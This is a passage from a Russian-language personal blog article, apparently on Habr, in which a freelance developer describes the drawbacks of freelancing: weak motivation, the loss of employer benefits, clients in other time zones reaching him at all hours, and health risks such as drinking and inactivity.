становятся бессмысленными. Тебя некому пушить!\r\n\r\nУ них же как ведь? — Один побёг и айда за мной! — «А мартышка смотрит, мартышка повторяет», вот так и получается.\r\n\r\nТо же занятие спортом. Ты уже взрослый дядя, видишь, что здоровьечко то надо поддерживать, нагружать себя. — А ты поди себя заставь, вот просто так, регулярно ходить в спортзал. Дошло до того, что я организовал спортзал дома. Но мотивация соответствующая. \r\n\r\nСоциальная защищенность\r\n… Пенсионный фонд. Тут все как в этой песне. Работая недолгое время в компании, у меня было официальное место работы, мед.страховка, абонементы в фитнес клуб и библиотеку. Разумеется железо для работы, которое по щелчку могли поменять на любое другое.\r\n\r\nНе скажу, что на фрилансе, отсутствие «печенек» меня сильно напрягает — зато свобода…\r\n\r\n«Свобода»\r\nПару слов о свободе. Люди, которые далеки от фриланса, думают, что мол куда захотел — туда пошел. Взял ноут, сел на самолет и йухууу! \r\n\r\nНу во-первых ноут — это может копирайтеру хватит. А мне нужен мощный комп, 2 монитора и макбук для тестов. Плюс быстрый инет.\r\n\r\nИ второе заблуждение по поводу свободы. Да, хоть ты и не сидишь в кубикле целый день, но клиенты виртуально держат за кокосы, постоянно теребя мессенджер. В свою очередь — не ответить довольно проблематично. А клиенты из разных таймзон. И вот ты в 2 часа тестируешь софт, на рассвете воскресенья деплоишь в прод, а посреди недели тебе пишут 3 человека синхронно, что у них дедлайн. Такая гипертрофированная свобода.\r\n\r\nЗдоровье\r\nНемного о здоровье. Дело в том, что лайфстайл фрилансера подразумевает полную свободу действий. Да, это противоречит пункту выше, но вас в любом случае никто и ничего не сдерживает, например напиться до поросячьего визга посреди недели.\r\n\r\nТакая разнузданность приводит к девиантному поведению со временем. \r\n\r\nТо бишь запросто можно развлекать себя бутылкой, чуть ли не каждый день. С работы не выгонят. Деньги как правило есть.\r\n\r\nНу и в довесок малоподвижный образ жизни может превратить фрилансера в развалину еще до 40-ка.\r\n\r\n\r\nПожалуй на этом можно закончить список недостатков фриланса. Обладая критическим и/или креативным мышлением — все эти грабли обходятся. Мое дело было поделиться опытом и возможно снять с кого-то розовые очки.\r\n\r\nДля баланса во Вселенной, следующей планирую статью — Как стать успешным фрилансером.", "images": [{"img": "https://habrastorage.org/webt/hh/o3/lw/hho3lwehvgqwntfcr-p5qwnpgvg.png"}]}]